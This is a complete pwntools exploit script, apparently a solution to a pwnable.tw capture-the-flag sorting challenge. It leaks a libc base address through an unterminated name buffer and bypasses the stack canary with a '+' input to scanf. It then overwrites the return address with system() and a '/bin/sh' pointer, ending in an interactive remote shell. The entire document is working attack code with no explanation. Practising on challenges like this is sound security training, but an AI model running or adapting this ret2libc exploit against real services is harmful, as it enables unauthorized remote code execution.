#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
#r = process('/tmp/p/a', env = {'LD_PRELOAD' : '/tmp/p/libc'})
r = remote('chall.pwnable.tw' ,10101)
def send_data(size, num):
	for i in range(size):
		r.sendlineafter('number : ', str(num))

off = 1769472
system_off = 0x003a940
sh_off = 0x158E8B
r.sendlineafter(':', "a"*24)
r.recvuntil('\n')
base = u32(r.recvuntil('\xf7').rjust(4, '\x00')) - off
print "base: ",hex(base)
system = system_off + base
sh = sh_off + base
r.sendlineafter("numbers do you what to sort :", str(35))
send_data(24, 0)
r.sendlineafter('number : ', "+")
send_data(8, system)
send_data(2, sh)
r.interactive()